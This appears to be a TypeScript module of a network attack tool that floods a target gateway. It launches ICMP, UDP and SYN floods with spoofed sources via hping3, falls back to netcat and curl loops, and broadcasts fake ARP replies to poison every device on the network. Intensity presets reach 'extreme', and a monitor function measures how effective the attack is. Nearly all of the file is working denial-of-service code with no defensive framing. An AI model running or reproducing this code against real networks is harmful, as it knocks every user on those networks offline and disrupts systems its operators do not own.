import { exec } from './exec';

export interface FloodConfig {
  targetIp: string;
  interface: string;
  intensity?: 'low' | 'medium' | 'high' | 'extreme';
}

/**
 * Start gateway flood attack
 * This saturates the gateway bandwidth so ALL devices suffer
 */
export async function startGatewayFlood(config: FloodConfig): Promise<void> {
  const { targetIp, interface: iface, intensity = 'high' } = config;

  console.log('  Starting gateway flood attack...');
  
  // Get intensity parameters
  const params = getIntensityParams(intensity);
  
  try {
    // Method 1: ICMP Flood (Ping flood)
    console.log(`  Launching ICMP flood (${params.packetSize} bytes, ${params.rate} pps)...`);
    exec(
      `hping3 -1 --flood --rand-source -d ${params.packetSize} ${targetIp} > /dev/null 2>&1 &`,
      { ignoreError: true }
    ).catch(() => {
      // Fallback if hping3 not available
      console.log('  hping3 not available, using ping flood...');
      exec(
        `ping -f -s ${params.packetSize} ${targetIp} > /dev/null 2>&1 &`,
        { ignoreError: true }
      );
    });

    // Method 2: UDP Flood
    console.log(`  Launching UDP flood...`);
    exec(
      `hping3 --udp --flood --rand-source -p 53 ${targetIp} > /dev/null 2>&1 &`,
      { ignoreError: true }
    ).catch(() => {
      // Fallback: custom UDP flood
      startCustomUDPFlood(targetIp, params.rate);
    });

    // Method 3: SYN Flood
    console.log(`  Launching SYN flood...`);
    exec(
      `hping3 -S --flood --rand-source -p 80,443 ${targetIp} > /dev/null 2>&1 &`,
      { ignoreError: true }
    ).catch(() => {
      // Fallback: use nmap
      exec(
        `nmap -sS --scan-delay 0 --max-rate ${params.rate} ${targetIp} > /dev/null 2>&1 &`,
        { ignoreError: true }
      );
    });

    // Method 4: ARP Cache Poisoning (all devices)
    console.log(`  Poisoning ARP cache network-wide...`);
    startArpChaos(targetIp, iface);

    // Method 5: Bandwidth saturation with iperf-like traffic
    console.log(`  Saturating bandwidth...`);
    for (let i = 0; i < params.threads; i++) {
      startBandwidthSaturation(targetIp, i);
    }

    console.log(`  ✓ Gateway flood active at ${intensity.toUpperCase()} intensity`);
    console.log(`  ✓ ${params.threads} attack threads spawned`);
    
  } catch (error) {
    throw new Error(`Gateway flood failed: ${error}`);
  }
}

/**
 * Stop gateway flood attack
 */
export async function stopGatewayFlood(): Promise<void> {
  console.log('  Stopping gateway flood...');
  
  try {
    // Kill all hping3 processes
    await exec('pkill -9 hping3', { ignoreError: true });
    
    // Kill all ping floods
    await exec('pkill -9 ping', { ignoreError: true });
    
    // Kill bandwidth saturation processes
    await exec('pkill -9 -f "dd if=/dev/zero"', { ignoreError: true });
    await exec('pkill -9 -f "nc.*gateway"', { ignoreError: true });
    
    // Clear any background jobs
    await exec('killall -9 bash 2>/dev/null', { ignoreError: true });
    
    console.log('  ✓ Gateway flood stopped');
  } catch (error) {
    console.error('  Warning: Some flood processes may still be running');
  }
}

/**
 * Get intensity parameters
 */
function getIntensityParams(intensity: string): {
  rate: number;
  packetSize: number;
  threads: number;
} {
  switch (intensity) {
    case 'low':
      return { rate: 1000, packetSize: 1000, threads: 2 };
    case 'medium':
      return { rate: 5000, packetSize: 5000, threads: 5 };
    case 'high':
      return { rate: 10000, packetSize: 10000, threads: 10 };
    case 'extreme':
      return { rate: 50000, packetSize: 65000, threads: 20 };
    default:
      return { rate: 10000, packetSize: 10000, threads: 10 };
  }
}

/**
 * Custom UDP flood (fallback if hping3 not available)
 */
function startCustomUDPFlood(targetIp: string, rate: number): void {
  // Create background process that sends UDP packets
  const script = `
    while true; do
      echo "FLOOD" | nc -u -w0 ${targetIp} 53 2>/dev/null
      echo "FLOOD" | nc -u -w0 ${targetIp} 80 2>/dev/null
      echo "FLOOD" | nc -u -w0 ${targetIp} 443 2>/dev/null
    done
  `;
  
  exec(`bash -c '${script}' > /dev/null 2>&1 &`, { ignoreError: true });
}

/**
 * Start ARP chaos - poison entire network
 */
function startArpChaos(gatewayIp: string, iface: string): void {
  // Broadcast fake ARP replies to confuse all devices
  const script = `
    while true; do
      # Tell everyone that gateway is at a fake MAC
      arping -c 1 -A -I ${iface} -s ${gatewayIp} -S 00:00:00:00:00:00 255.255.255.255 2>/dev/null
      sleep 0.1
    done
  `;
  
  exec(`bash -c '${script}' > /dev/null 2>&1 &`, { ignoreError: true });
}

/**
 * Bandwidth saturation - send massive data to gateway
 */
function startBandwidthSaturation(targetIp: string, threadId: number): void {
  // Method 1: HTTP flood
  const httpFlood = `
    while true; do
      curl -s -o /dev/null --max-time 1 http://${targetIp} 2>/dev/null || true
      curl -s -o /dev/null --max-time 1 https://${targetIp} 2>/dev/null || true
    done
  `;
  
  exec(`bash -c '${httpFlood}' > /dev/null 2>&1 &`, { ignoreError: true });

  // Method 2: Raw data flood via netcat
  const dataFlood = `
    while true; do
      dd if=/dev/zero bs=1M count=10 2>/dev/null | nc -w1 ${targetIp} 80 2>/dev/null || true
      dd if=/dev/urandom bs=1M count=5 2>/dev/null | nc -w1 ${targetIp} 443 2>/dev/null || true
    done
  `;
  
  exec(`bash -c '${dataFlood}' > /dev/null 2>&1 &`, { ignoreError: true });
}

/**
 * Check if flood tools are available
 */
export async function checkFloodTools(): Promise<{
  hping3: boolean;
  curl: boolean;
  nc: boolean;
}> {
  const checkCommand = async (cmd: string): Promise<boolean> => {
    try {
      await exec(`which ${cmd}`);
      return true;
    } catch {
      return false;
    }
  };

  return {
    hping3: await checkCommand('hping3'),
    curl: await checkCommand('curl'),
    nc: await checkCommand('nc'),
  };
}

/**
 * Monitor flood effectiveness
 */
export async function monitorFlood(targetIp: string): Promise<{
  cpuLoad: number;
  packetRate: number;
  responseTime: number;
}> {
  try {
    // Measure response time
    const start = Date.now();
    await exec(`ping -c 1 -W 2 ${targetIp}`, { ignoreError: true });
    const responseTime = Date.now() - start;

    // Get packet rate (rough estimate from interface stats)
    const { stdout } = await exec('cat /proc/net/dev | grep wlan', { ignoreError: true });
    const match = stdout.match(/\s+(\d+)\s+(\d+)/);
    const packets = match ? parseInt(match[1] || '0') : 0;

    // Get system load
    const { stdout: loadAvg } = await exec('cat /proc/loadavg');
    const cpuLoad = parseFloat(loadAvg.split(' ')[0] || '0');

    return {
      cpuLoad,
      packetRate: packets,
      responseTime,
    };
  } catch {
    return { cpuLoad: 0, packetRate: 0, responseTime: 9999 };
  }
}